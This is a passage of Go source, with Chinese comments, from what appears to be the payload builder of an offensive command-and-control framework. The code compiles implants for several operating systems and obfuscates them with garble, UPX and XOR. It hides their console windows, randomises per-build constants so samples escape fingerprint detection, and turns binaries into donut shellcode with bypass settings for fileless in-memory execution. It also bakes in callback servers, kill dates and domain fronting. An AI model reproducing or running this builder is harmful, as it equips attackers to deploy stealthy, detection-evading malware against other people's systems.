		logging.Debug("builder", "tcp profile: removed TLS client impl files (stdlib net/http not needed)")
	} else if features.NormalizeProfile(profile) == features.ProfileLight {
		if err := os.Remove(filepath.Join(tmpDir, "transport_tls_utls.go")); err == nil {
			logging.Debug("builder", "light profile: removed transport_tls_utls.go (stdlib TLS)")
		}
	}

	// 老系统兼容：Windows 7 / Server 2008 R2 (NT 6.1) 没有 GetSystemTimePreciseAsFileTime
	// (该 API 仅 Windows 8+ 提供)。Go >= 1.22 编译的 exe 启动时会依赖它，
	// 在这些系统上会报"无法定位程序输入点"而无法启动。
	// 因此 Windows 载荷默认使用 Go 1.20.x（最后一个官方支持 Windows 7 的工具链）
	// 编译，保证 Server 2008 R2 / Windows 7 兼容。GOTOOLCHAIN 由本机 go 命令
	// (需 >= 1.21) 自动下载并缓存 go1.20.14，无需手动安装。
	// garble 模式与 go1.20 工具链不兼容，保持使用当前工具链。
	goToolchain := ""
	if targetOS == "windows" && !useGarble {
		goToolchain = "go1.20.14"
	}

	buildEnv := func(extra ...string) []string {
		env := append(os.Environ(),
			fmt.Sprintf("GOOS=%s", targetOS),
			fmt.Sprintf("GOARCH=%s", arch),
		)
		if goToolchain != "" {
			env = append(env, "GOTOOLCHAIN="+goToolchain)
		}
		return append(env, extra...)
	}

	// 依赖：模板自带 go.mod（锁定 go1.20 兼容版本）+ tools.go
	// （显式声明构建标签依赖，防止 tidy 升级到不兼容版本）。
	// copyImplantSource 已把 go.mod/go.sum/tools.go 复制到 tmpDir，
	// 这里只需 go mod download 拉取锁定版本，无需 init/get/tidy。
	downloadCmd := exec.Command("go", "mod", "download")
	downloadCmd.Dir = tmpDir
	downloadCmd.Env = buildEnv()
	if output, err := downloadCmd.CombinedOutput(); err != nil {
		fmt.Printf("go mod download output: %s\n", string(output))
	}

	var outputName string
	if targetOS == "windows" {
		outputName = "implant.exe"
	} else {
		outputName = "implant"
	}
	outputPath := filepath.Join(tmpDir, outputName)

	// 把生效的构建档位写进日志：排查"载荷里为什么有这个特征/为什么没生效"时，
	// 第一现场就是这行（标签决定哪些模块进载荷，例如 evasionscan 默认关闭）。
	toolchain := goToolchain
	if toolchain == "" {
		toolchain = "current"
	}
	logging.Info("builder", "compiling implant: os=%s arch=%s tags=%q garble=%v go=%s",
		targetOS, arch, buildTags, useGarble, toolchain)

	if useGarble {
		// Garble 混淆编译
		// 注意: garble flags 必须放在 build 命令之前 (garble -literals build ./pkg)
		// -literals: 混淆字符串字面量
		// -tiny: 最小化输出（移除调试信息）
		// -seed=random: 随机种子
		garbleArgs := []string{"-literals", "-tiny", "-seed=random", "build", "-trimpath"}
		if buildTags != "" {
			garbleArgs = append(garbleArgs, "-tags", buildTags)
		}
		// ldflags 与标准 go build 保持一致：必须带 -s -w（去符号表与 DWARF）与 -buildid=，
		// 否则 garble 产物会保留全部调试信息 —— 实测同一载荷 "仅 -H windowsgui" 是 12.29MB，
		// 补上 -s -w -buildid= 后体积与标准构建同量级，且 pclntab 里的函数名已被 garble 混淆。
		ldflags := "-s -w -buildid="
		if targetOS == "windows" && os.Getenv("TOSHELL_CONSOLE") == "" {
			ldflags += " -H windowsgui"
		}
		garbleArgs = append(garbleArgs, "-ldflags", ldflags)
		garbleArgs = append(garbleArgs, "-o", outputPath, ".")
		buildCmd := exec.Command("garble", garbleArgs...)
		buildCmd.Dir = tmpDir
		buildCmd.Env = buildEnv("CGO_ENABLED=0")

		output, err := buildCmd.CombinedOutput()
		if err != nil {
			return nil, fmt.Errorf("garble build failed: %v, output: %s", err, string(output))
		}
		logging.Info("builder", "garble build successful for %s/%s", targetOS, arch)
	} else {
		// 标准 go build
		// -buildid= 去除 Go build ID，-trimpath 去掉源码绝对路径，降低静态指纹。
		// 注意：不要加 -buildmode=pie —— Windows PE 默认即支持 ASLR
		// （链接器自动设置 DYNAMIC_BASE），PIE 在 Windows/go1.20 下会让
		// 体积膨胀约 1.75MB（3.5MB → 5.26MB），纯属负担无收益。
		ldflags := "-s -w -buildid="
		// Windows 植入端默认隐藏控制台窗口（GUI 子系统），运行不弹窗。
		// 开发调试需要控制台日志时，构建服务端进程设 TOSHELL_CONSOLE=1 保留。
		if targetOS == "windows" && os.Getenv("TOSHELL_CONSOLE") == "" {
			ldflags += " -H windowsgui"
		}

		buildArgs := []string{"build", "-trimpath", "-o", outputPath, "-ldflags", ldflags}
		if buildTags != "" {
			buildArgs = append(buildArgs, "-tags", buildTags)
		}
		buildArgs = append(buildArgs, ".")
		buildCmd := exec.Command("go", buildArgs...)
		buildCmd.Dir = tmpDir
		buildCmd.Env = buildEnv("CGO_ENABLED=0")

		output, err := buildCmd.CombinedOutput()
		if err != nil {
			return nil, fmt.Errorf("build failed: %v, output: %s", err, string(output))
		}
	}

	return os.ReadFile(outputPath)
}

// compressWithUPX applies UPX compression to a Windows PE binary.
func (b *Builder) compressWithUPX(binary []byte) ([]byte, error) {
	if b.upxPath == "" {
		return nil, fmt.Errorf("UPX binary not found")
	}
	// Generate random suffix for temp file to avoid collisions
	suffix, _ := rand.Int(rand.Reader, big.NewInt(99999))
	tmpExe := filepath.Join(os.TempDir(), fmt.Sprintf("toshell_upx_%d.exe", suffix.Int64()))

	if err := os.WriteFile(tmpExe, binary, 0755); err != nil {
		return nil, fmt.Errorf("failed to write temp exe for UPX: %w", err)
	}
	defer os.Remove(tmpExe)

	cmd := exec.Command(b.upxPath, "--best", "--lzma", tmpExe)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("upx failed: %w, output: %s", err, string(output))
	}

	return os.ReadFile(tmpExe)
}

func (b *Builder) buildConfig(opts BuildOptions) map[string]interface{} {
	return map[string]interface{}{
		"server_url":    opts.ServerURL,
		"protocol":      opts.Protocol,
		"transport":     transportForProtocol(opts.Protocol),
		"interval":      opts.Interval,
		"jitter":        opts.Jitter,
		"retry_count":   opts.RetryCount,
		"retry_wait":    opts.RetryWait,
		"kill_date":     opts.KillDate,
		"working_hours": opts.WorkingHours,
		"relay_listen":  opts.RelayListen,
		"front_domain":  opts.FrontDomain,
		"modules":       opts.Modules,
	}
}

func (b *Builder) convertToShellcode(binary []byte) ([]byte, error) {
	return binary, nil
}

func GenerateConfig(serverURL string, interval, jitter uint32) ([]byte, error) {
	cfg := map[string]interface{}{
		"server_url": serverURL,
		"protocol":   "https",
		"interval":   interval,
		"jitter":     jitter,
	}
	return json.Marshal(cfg)
}

func (b *Builder) GetSupportedFormats(os string) []string {
	if os == "windows" {
		return []string{"exe", "dll", "shellcode", "shellcode_bin", "raw"}
	}
	return []string{"bin", "so", "raw"}
}

func (b *Builder) GetSupportedOS() []string {
	return []string{"windows", "linux", "darwin"}
}

func (b *Builder) GetSupportedArch() []string {
	return []string{"amd64", "386", "arm64"}
}

// GarbleAvailable returns whether garble obfuscation tool is installed and usable.
// 兼容旧调用；需要原因说明时用 GarbleStatus。
func (b *Builder) GarbleAvailable() bool {
	ok, _ := b.GarbleStatus()
	return ok
}

// UPXAvailable returns whether UPX compression tool is installed.
func (b *Builder) UPXAvailable() bool {
	return b.useUPX
}

// GenerateQuickShellcode 快速生成注入用的shellcode
// 根据会话信息自动生成适合的shellcode
// callbackHost 为可选的回连 IP/域名，非空时优先使用（用于从请求上下文动态获取）
func (b *Builder) GenerateQuickShellcode(sessionOS, sessionArch string, callbackHost string) (*BuildResult, error) {
	cfg := config.Get()

	// 优先级：callbackHost > cfg.Listener.Host > cfg.Server.Host
	listenerHost := callbackHost
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Listener.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Server.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		return nil, fmt.Errorf("无法确定 implant 回连地址：请在配置文件中将 listener.host 或 server.host 设置为服务器的实际 IP 地址，或通过 callbackHost 参数传入")
	}

	scheme := "http"
	if cfg.Listener.TLSEnabled {
		scheme = "https"
	}
	// 【关键】端口强制取自 cfg.Listener.Port，绝不从 HTTP Host 头解析
	serverURL := fmt.Sprintf("%s://%s:%d", scheme, listenerHost, cfg.Listener.Port)

	logging.Info("builder", "🔥 [CRITICAL DEBUG] GenerateQuickShellcode -> OS: %s, Arch: %s, callbackHost: [%s], finalHost: [%s], finalPort: [%d], serverURL: [%s]",
		sessionOS, sessionArch, callbackHost, listenerHost, cfg.Listener.Port, serverURL)

	opts := BuildOptions{
		OS:        sessionOS,
		Arch:      sessionArch,
		Format:    "shellcode",
		ServerURL: serverURL,
		Protocol:  cfg.Listener.Protocol,
		Interval:  cfg.Implant.Interval,
		Jitter:    cfg.Implant.Jitter,
		RetryWait: cfg.Implant.RetryWait,
	}

	return b.buildShellcode(opts)
}

// appendConfigBlock 在 shellcode 二进制尾部追加配置块。
// 格式：<encMagic> <4字节大端JSON长度(加密)> <JSON(加密)>
// encMagic 为加密后的配置块标识（常量），长度字段与 JSON 均用
// 循环密钥加密。二进制尾部不保留明文特征（项目标识、回连地址）。
// implant 启动时通过 encMagic 常量定位块起点，按长度字段解码解析。
// 除回连地址与加密密钥外，jitter/重连/KillDate/WorkingHours 等行为参数
// 一并写入配置块，使同一份植入端产物可被运行时配置动态调整。
// transportForProtocol 将构建协议映射为植入端通道类型：
// tcp → 自定义 TCP 帧协议；http/https → HTTP(S) 轮询（域前置）；
// websocket 当前无独立实现，回退 TCP；空 → 让植入端按 server_url 前缀回退。
func transportForProtocol(protocol string) string {
	switch strings.ToLower(protocol) {
	case "tcp", "":
		return "tcp"
	case "http", "https":
		return "http"
	case "websocket", "ws", "wss":
		return "websocket"
	case "mqtt", "mqtts":
		return "mqtt"
	default:
		return "tcp"
	}
}

func appendConfigBlock(shellcode []byte, serverURL, encryptionKeyB64 string, opts *BuildOptions) []byte {
	cfg := map[string]interface{}{
		"server_url":     serverURL,
		"encryption_key": encryptionKeyB64,
	}
	if opts != nil {
		cfg["interval"] = opts.Interval
		cfg["jitter"] = opts.Jitter
		cfg["retry_wait"] = opts.RetryWait
		cfg["kill_date"] = opts.KillDate
		cfg["working_hours"] = opts.WorkingHours
		cfg["relay_listen"] = opts.RelayListen
		cfg["front_domain"] = opts.FrontDomain
		cfg["transport"] = transportForProtocol(opts.Protocol)
	}
	jsonData, _ := json.Marshal(cfg)

	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(jsonData)))

	// 每构建随机魔数/密钥（P0-1：打破跨样本同指纹）。未提供时回退包级默认（兼容旧 shellcode 工具）。
	magic := []byte(configBlockMagic)
	key := configBlockKey[:]
	if opts != nil {
		if opts.CfgMagic != "" {
			magic = []byte(opts.CfgMagic)
		}
		key = opts.CfgKey[:]
	}
	magicEnc := xorBlockKey(magic, key)

	block := make([]byte, 0, len(magicEnc)+4+len(jsonData))
	block = append(block, magicEnc...)
	block = append(block, xorBlockKeyAtKey(lenBuf, len(magicEnc), key)...)
	block = append(block, xorBlockKeyAtKey(jsonData, len(magicEnc)+4, key)...)
	return append(shellcode, block...)
}

// xorBlockKeyAtKey 用给定循环密钥逐字节加密/解密，密钥流从块内偏移 startOff 开始。
func xorBlockKeyAtKey(b []byte, startOff int, key []byte) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ key[(startOff+i)%len(key)]
	}
	return out
}

// injectBuildConstants 把每构建随机生成的配置块魔数与 XOR 密钥注入植入端源码
// （P0-1：打破跨样本同指纹）。必须在 obfuscateImplantSources 之前调用：
//   - main.go 的 configBlockMagic：明文改成随机值，之后字符串混淆器会按固定 xd 基准
//     把它再加密（不同明文→不同密文）；植入端运行时 xd 解出新值，与服务端写块一致。
//   - main.go 的 capabilityToken（v1.4.0 S4）：把"本构建真的编译进去了哪些能力"的
//     版本化位图令牌烘进载荷，运行期随心跳上报，C2 用它决定控制台显示哪些面板。
//     同样是明文注入 → 混淆成 xd("hex")，二进制里不留下能力清单明文。
//   - obfuscate.go 的 blockKey：obfuscate.go 被混淆器跳过，原样进二进制，可安全持有注入值。
func (b *Builder) injectBuildConstants(tmpDir string, opts *BuildOptions) error {
	// 能力位图（v1.4.0 S4）：先算好，"真的编译进去了什么"就是这一步的结论。
	capInput := capabilityInput(opts)
	capabilities := features.Derive(capInput)
	// 能力位是"控制台显示什么"的唯一依据，烘焙结果必须留痕：
	// 「这个载荷为什么没有注入面板」的第一现场就是这行日志。
	logging.Info("builder", "capabilities baked: profile=%s os=%s bof=%v mask=0x%016X features=%s",
		features.NormalizeProfile(capInput.Profile), capInput.OS, capInput.BOF,
		features.Bitmask(capabilities), strings.Join(capabilities, ","))

	// obfuscate.go（解码层，被跳过不混淆）
	if data, err := os.ReadFile(filepath.Join(tmpDir, "obfuscate.go")); err == nil {
		content := string(data)
		content = strings.ReplaceAll(content,
			"var blockKey = [4]byte{0x5A, 0xC3, 0x2D, 0x9F}",
			fmt.Sprintf("var blockKey = [4]byte{0x%02X, 0x%02X, 0x%02X, 0x%02X}", opts.CfgKey[0], opts.CfgKey[1], opts.CfgKey[2], opts.CfgKey[3]))
		content = strings.ReplaceAll(content,
			"var xdBase byte = 0x5A",
			fmt.Sprintf("var xdBase byte = 0x%02X", opts.XfBase))
		_ = os.WriteFile(filepath.Join(tmpDir, "obfuscate.go"), []byte(content), 0644)
	}
	// main.go（configBlockMagic 明文 + 能力位令牌；obfuscate 会再混淆它们，
	// 但明文不同 → 密文不同）
	if data, err := os.ReadFile(filepath.Join(tmpDir, "main.go")); err == nil {
		content := strings.ReplaceAll(string(data),
			`var configBlockMagic = "TOSHELL_CFG_V1:"`,
			fmt.Sprintf(`var configBlockMagic = %q`, opts.CfgMagic))
		// 能力位图（v1.4.0 S4）：把"本次构建真的编译进去了哪些能力"烘进载荷，
		// 让"界面上的按钮"有据可依。与 configBlockMagic 同样的两层处理 ——
		// 这里注入明文令牌，紧接着 obfuscateImplantSources 会把它加密成 xd("hex")，
		// 二进制里不保留能力清单明文（能力清单本身就是指纹）；
		// 运行期 xd 解出令牌，随心跳 Modules 上报，C2 用同一个 features 包解码。
		content = strings.ReplaceAll(content,
			`var capabilityToken = "cap:v1:0000000000000000"`,
			fmt.Sprintf(`var capabilityToken = %q`, features.EncodeToken(capInput)))
		_ = os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(content), 0644)
	}
	// apihash_windows.go（FNF-1a 种子/乘子随机化）
	if data, err := os.ReadFile(filepath.Join(tmpDir, "apihash_windows.go")); err == nil {
		content := string(data)
		content = strings.ReplaceAll(content,
			"var apiHashSeed uint32 = 0x811c9dc5",
			fmt.Sprintf("var apiHashSeed uint32 = 0x%08X", opts.ApiHashSeed))
		content = strings.ReplaceAll(content,
			"var apiHashMul uint32 = 0x01000193",
			fmt.Sprintf("var apiHashMul uint32 = 0x%08X", opts.ApiHashMul))
		_ = os.WriteFile(filepath.Join(tmpDir, "apihash_windows.go"), []byte(content), 0644)
	}
	return nil
}

// xorBlockKeyAt 用循环密钥逐字节加密/解密，密钥流从块内偏移 startOff 开始
// （与植入端 xdBlockAt 完全一致）。位置无关，长度不变。
func xorBlockKeyAt(b []byte, startOff int) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ configBlockKey[(startOff+i)%len(configBlockKey)]
	}
	return out
}

// AppendConfigToShellcode 将新的 serverURL（及可选加密密钥）写入 shellcode 尾部配置块。
// 若 shellcode 已有配置块则先剥离旧块再追加新块，确保幂等。
// encryptionKeyB64 传空字符串则保留 shellcode 编译时内嵌的默认密钥。
func AppendConfigToShellcode(shellcode []byte, serverURL, encryptionKeyB64 string) []byte {
	shellcode = stripConfigBlock(shellcode)
	return appendConfigBlock(shellcode, serverURL, encryptionKeyB64, nil)
}

// stripConfigBlock 剥离 shellcode 尾部已有的配置块（如有）。
// 通过加密 magic 常量序列定位块起点（无需解密整个文件），按位置裁剪。
func stripConfigBlock(shellcode []byte) []byte {
	magic := configBlockMagicEnc
	mlen := len(magic)
	if len(shellcode) < mlen+4 {
		return shellcode
	}
	// 找最后一个 magic 作为配置块起点标记
	start := -1
	for i := len(shellcode) - mlen; i >= 0; i-- {
		if bytes.Equal(shellcode[i:i+mlen], magic) {
			start = i
			break
		}
	}
	if start < 0 {
		return shellcode
	}
	return shellcode[:start]
}

func (b *Builder) buildShellcode(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch, "")
	if err != nil {
		return nil, fmt.Errorf("failed to generate shellcode: %v", err)
	}

	// 追加尾部配置块，使 shellcode 在运行时可动态读取回连地址
	cfg := config.Get()
	encKeyB64 := base64.StdEncoding.EncodeToString([]byte(cfg.Listener.EncryptionKey))
	shellcode = appendConfigBlock(shellcode, opts.ServerURL, encKeyB64, &opts)

	// XOR 加密（如开启）
	var xorKey []byte
	hasXOR := false
	if opts.XOREncrypt {
		keySize := opts.XORKeySize
		if keySize <= 0 {
			keySize = 16 // default
		}
		xorKey, err = generateRandomKey(keySize)
		if err != nil {
			logging.Warn("builder", "XOR key generation failed, skipping XOR encryption: %v", err)
		} else {
			shellcode = xorEncrypt(shellcode, xorKey)
			hasXOR = true
			logging.Info("builder", "XOR encryption applied (key_size=%d)", keySize)
		}
	}

	configData, _ := json.Marshal(b.buildConfig(opts))
	shellcodeHex := hex.EncodeToString(shellcode)
	shellcodeBase64 := base64.StdEncoding.EncodeToString(shellcode)

	return &BuildResult{
		Binary:          shellcode,
		Config:          configData,
		Shellcode:       shellcode,
		ShellcodeHex:    shellcodeHex,
		ShellcodeBase64: shellcodeBase64,
		XORKey:          xorKey,
		HasXOR:          hasXOR,
	}, nil
}

// ConvertToShellcode 将任意 PE 二进制（EXE/DLL）经 donut 转换为位置无关 shellcode，
// 供"全内存无文件执行"管线在服务端完成 EXE→shellcode 转换后，交由植入端内存注入执行。
func (b *Builder) ConvertToShellcode(binary []byte, arch string) ([]byte, error) {
	return b.generateShellcodeWithDonut(binary, arch, "")
}

// ConvertToShellcodeWithParams 同 ConvertToShellcode，但把 params 作为
// 被转换程序的命令行参数一并嵌入（donut Parameters）。
func (b *Builder) ConvertToShellcodeWithParams(binary []byte, arch, params string) ([]byte, error) {
	return b.generateShellcodeWithDonut(binary, arch, params)
}

// generateShellcodeWithDonut generates shellcode using the donut library
//
// params 为传给被内存执行程序（EXE 命令行 / DLL 导出函数）的参数；
// 受 donut 结构限制（Param[DONUT_MAX_NAME]）最长 255 字节，超长在这里直接报错，
// 避免被静默截断成"参数没生效"。
func (b *Builder) generateShellcodeWithDonut(binary []byte, arch, params string) ([]byte, error) {
	if len(params) > 255 {
		return nil, fmt.Errorf("内存执行参数过长（%d 字节，donut 上限 255）：请精简参数或改用落地执行", len(params))
	}
	targetArch := donut.X84
	switch arch {
	case "386":
		targetArch = donut.X32
	case "amd64":
		targetArch = donut.X64
	default:
		targetArch = donut.X84
	}

	donutConfig := &donut.DonutConfig{
		Arch:     targetArch,
		InstType: donut.DONUT_INSTANCE_PIC,
		Type:     donut.DONUT_MODULE_EXE,
		Entropy:  donut.DONUT_ENTROPY_DEFAULT,
		// Thread=1：把 EXE 入口点作为**独立线程**运行，植入体主线程不受影响；
		// ExitOpt=1（退出线程）而非 2（退出宿主进程）——旧配置 Thread=0 + ExitOpt=2
		// 会在内存执行的程序结束时调用 RtlExitUserProcess 把植入体一起干掉。
		Thread:     1,
		Compress:   1,
		Unicode:    0,
		ExitOpt:    1,
		Format:     1,
		Bypass:     3,
		Parameters: params,
	}

	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(binary), donutConfig)
	if err != nil {
		return nil, fmt.Errorf("donut shellcode generation failed: %v", err)
	}

	return shellcode.Bytes(), nil
}

func (b *Builder) buildShellcodeBin(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch, "")
	if err != nil {
		return nil, fmt.Errorf("failed to generate shellcode: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	return &BuildResult{
		Binary:    shellcode,
		Config:    configData,
		Shellcode: shellcode,
	}, nil
}

// ─── C 植入端编译管线 ────────────────────────────────────────────────
//
// 使用 mingw-w64 gcc（x86_64-w64-mingw32-gcc 或 i686-w64-mingw32-gcc）
// 编译 internal/server/builder/implant_c/main.c，产出体积极小的 PE
// （约 50KB，Go 版 3.3MB 的 1/60）。支持 x86/x64 架构。
// 占位符替换与 Go 模板一致（{{SERVER_URL}}/{{ENCRYPTION_KEY}}/{{INTERVAL}}/{{RETRY_WAIT}}）。
// 配置块（TOSHELL_CFG_V1）由 appendConfigBlock 统一追加，C 端启动时解析。

// resolveCGCCPath 已由 toolchain.go 的 resolveGCC 取代：
// 新版按配置/环境变量/便携目录/常见安装目录/PATH/注册表 PATH 逐级探测，
// 并用 `gcc -dumpmachine` 校验目标架构（旧版只看少量硬编码目录 + 进程 PATH，
// 且会把 32 位 gcc 静默用于 amd64 构建）。

func extIfWindows(binName string) string {
	if strings.Contains(binName, ".exe") {
		return ".exe"
	}
	return ""
}

// buildCExecutable 编译 C 植入端并追加配置块。
func (b *Builder) buildCExecutable(opts BuildOptions) (*BuildResult, error) {
	if opts.Format != "exe" && opts.Format != "bin" && opts.Format != "raw" {
		return nil, fmt.Errorf("C implant supports exe/bin/raw formats, got %s", opts.Format)
	}

	srcDir := filepath.Join(b.implantDir, "..", "implant_c")
	if info, err := os.Stat(filepath.Join(srcDir, "main.c")); err != nil || info.IsDir() {
		// 模板目录可能只配置了 Go 模板；尝试可执行文件同目录
		if exePath, err := os.Executable(); err == nil {
			alt := filepath.Join(filepath.Dir(exePath), "implant_c", "main.c")
			if info2, err2 := os.Stat(alt); err2 == nil && !info2.IsDir() {
				srcDir = filepath.Join(filepath.Dir(exePath), "implant_c")
			} else {
				return nil, fmt.Errorf("C implant template not found (expected implant_c/main.c next to implant dir or server binary)")
			}
		} else {
			return nil, fmt.Errorf("C implant template not found")
		}
	}

	gcc, gccWarning, err := resolveGCC(opts.Arch)
	if err != nil {
		return nil, err
	}
	if gccWarning != "" {
		logging.Warn("builder", "C 植入端：%s", gccWarning)
	}
	gccPath := gcc.Path

	// 生成临时源文件（替换占位符）
	tmpDir, err := os.MkdirTemp("", "toshell-cbuild-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	cfg := config.Get()
	key := []byte(cfg.Listener.EncryptionKey)
	encKeyB64 := base64.StdEncoding.EncodeToString(key)

	data, err := os.ReadFile(filepath.Join(srcDir, "main.c"))
	if err != nil {
		return nil, fmt.Errorf("failed to read C template: %v", err)
	}
	content := string(data)
	// C 模板：{{SERVER_URL}} 位于 C 字符串字面量内部（static char g_server[256] = "{{SERVER_URL}}"），
	// 只需转义引号与反斜杠，防止 `"; 恶意C代码; //` 注入编译出的 C 植入端。
	content = strings.ReplaceAll(content, "{{SERVER_URL}}", cQuote(opts.ServerURL))
	content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", encKeyB64)
	content = strings.ReplaceAll(content, "{{INTERVAL}}", fmt.Sprintf("%d", opts.Interval))
	content = strings.ReplaceAll(content, "{{RETRY_WAIT}}", fmt.Sprintf("%d", opts.RetryWait))
	// P0-1: 每构建随机注入 C 端配置块魔数与 XOR 密钥（三端一致，打破跨样本同指纹）
	content = strings.ReplaceAll(content, `#define CFG_MAGIC "TOSHELL_CFG_V1:"`,
		fmt.Sprintf(`#define CFG_MAGIC "%s"`, opts.CfgMagic))
	content = strings.ReplaceAll(content, `static const unsigned char g_xorKey[4] = {0x5A, 0xC3, 0x2D, 0x9F};`,
		fmt.Sprintf("static const unsigned char g_xorKey[4] = {0x%02X, 0x%02X, 0x%02X, 0x%02X};",
			opts.CfgKey[0], opts.CfgKey[1], opts.CfgKey[2], opts.CfgKey[3]))
	srcFile := filepath.Join(tmpDir, "main.c")
	if err := os.WriteFile(srcFile, []byte(content), 0644); err != nil {
		return nil, err
	}

	outputName := "implant"
	if opts.OS == "windows" {
		outputName = "implant.exe"
	}
	outputPath := filepath.Join(tmpDir, outputName)

	// 编译：-Os 优化体积、-s 去符号、gc-sections 裁未用节、
	// -mwindows 指定 GUI 子系统（不弹控制台黑窗，后台静默运行）
	args := []string{"-Os", "-s", "-ffunction-sections", "-fdata-sections",
		"-Wl,--gc-sections", "-mwindows", "-o", outputPath, srcFile,
		"-lws2_32", "-lbcrypt", "-ladvapi32"}
	cmd := exec.Command(gccPath, args...)
	cmd.Dir = tmpDir
	if output, err := cmd.CombinedOutput(); err != nil {
		logging.Error("builder", "C build failed: %v, output: %s", err, string(output))
		return nil, fmt.Errorf("C build failed: %v", err)
	}

	binary, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read C build output: %v", err)
	}

	// 追加配置块（与 Go 植入端同一格式）
	binary = appendConfigBlock(binary, opts.ServerURL, encKeyB64, &opts)

	configData, _ := json.Marshal(b.buildConfig(opts))
	return &BuildResult{
		Binary: binary,
		Config: configData,
	}, nil
}

// CLanguageAvailable 返回 C 植入端是否可用（mingw gcc 存在且模板齐全）。
// 兼容旧调用；需要原因说明时用 CStatus。
func (b *Builder) CLanguageAvailable() bool {
	ok, _ := b.CStatus()
	return ok
}

// cQuote 转义字符串以安全嵌入 C 字符串字面量（模板形如 "{{SERVER_URL}}" 自带引号）：
// 反斜杠与双引号转义，其余原样保留。防 `"; 恶意代码; //` 注入。
func cQuote(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch r {
		case '\\':
			b.WriteString(`\\`)
		case '"':
			b.WriteString(`\"`)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}
